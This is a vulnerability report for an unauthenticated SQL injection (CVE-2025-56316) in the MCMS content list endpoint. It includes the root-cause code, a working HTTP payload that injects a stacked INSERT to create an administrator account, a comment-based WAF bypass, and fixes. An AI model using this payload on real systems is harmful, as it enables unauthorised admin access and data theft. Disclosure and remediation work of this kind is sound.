# CVE-2025-56316 Vulnerability Report

## Overview
- **CVE ID**: CVE-2025-56316
- **CWE**: CWE-89 (SQL Injection)
- **Affected Product**: MCMS 5.5.0 - 6.0.1
- **Fixed Version**: 6.0.2
- **Severity**: Critical (CVSS 9.8)

## Vulnerability Description
A SQL injection vulnerability exists in the content_title parameter of the /cms/content/list endpoint in MCMS. The backend renders SQL from FreeMarker templates using unsanitized user input, allowing unauthenticated attackers to supply payloads that trigger stacked queries when the database is configured with `allowMultiQueries=true`.

## Exploitation Scenarios
1. **Account Creation**: An attacker can inject a stacked query (e.g., REPLACE INTO / INSERT INTO) via a frontend API endpoint to create or modify administrator accounts without authentication.
2. **Remote Code Execution**: If the database user has high privileges (e.g., root), an attacker can use INTO DUMPFILE to write files such as cron jobs or UDFs.

## Technical Analysis

### Root Cause
The vulnerable code in `ContentBizImpl.java`:

```java
String sql = ParserUtil.rendering(map, sqlFtl);
contentEntities = (List<ContentEntity>) tagBiz.excuteSql(sql);
```

The FreeMarker template directly interpolates user input:

```
<#if content_title??> and content_title like CONCAT(CONCAT('%','${content_title}'),'%')</#if>
```

### Key Prerequisites
- Database configured with `allowMultiQueries=true` (default in MCMS)
- Frontend endpoint accessible without authentication

## Proof of Concept

### Step 1: Send Stacked Query Injection
```http
GET /cms/content/list?typeid=1666653706550321153&content_title='),0);/*!50000INSERT*/%20INTO%20manager(manager_name,manager_password,ROLE_IDS)%20VALUES('pwned','94c208158b0c4f7f4dc689acc6dcc581','1');--%20 HTTP/1.1
Host: localhost:8081
```

Note: `/*!50000INSERT*/` is used to bypass the application's SQL injection WAF.

### Step 2: Login with Created User
```http
POST /ms/login.do HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

managerName=pwned&managerPassword=pwned123&rand_code=1234
```

### Expected Result
```json
{
  "result": true,
  "code": 200,
  "data": {
    "sessionId": "..."
  }
}
```

## Impact
- **Privilege Escalation**: Create admin accounts without authentication
- **Data Breach**: Full database access via SQL injection
- **Remote Code Execution**: Possible via INTO DUMPFILE if DB runs as root

## Remediation
1. Upgrade to MCMS v6.0.2 or later
2. Disable `allowMultiQueries=true` in production database configurations
3. Use parameterized queries instead of FreeMarker template SQL
4. Run database under least-privilege account

## References
- https://github.com/ming-soft/MCMS
- https://gitee.com/mingSoft/MCMS
- https://gist.github.com/Erosion2020/5892757e0c6eeb647a218d1c3b323cff
